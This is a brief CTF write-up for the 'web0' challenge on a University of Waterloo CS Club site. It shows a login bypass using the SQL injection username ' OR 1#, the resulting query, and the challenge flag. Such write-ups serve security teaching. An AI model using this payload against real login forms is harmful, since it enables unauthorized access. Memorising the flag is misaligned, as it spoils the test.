# web / web0

> Points: 1086

## Question


> [ctf.csclub.uwaterloo.ca/web/1](https://ctf.csclub.uwaterloo.ca/web/1)

## Solution

Clicking the link takes us to an authentication form. We use a simple SQL injection to bypass the authentication.
We put the username as `' OR 1#` and leave the password blank. Now the SQL query looks like:

```sql
SELECT * FROM users where username = '' OR 1#' and password = ''
```

With this, the site outputs the flag for us.

### Flag

`uwctf{0480fbf663a8241e}`
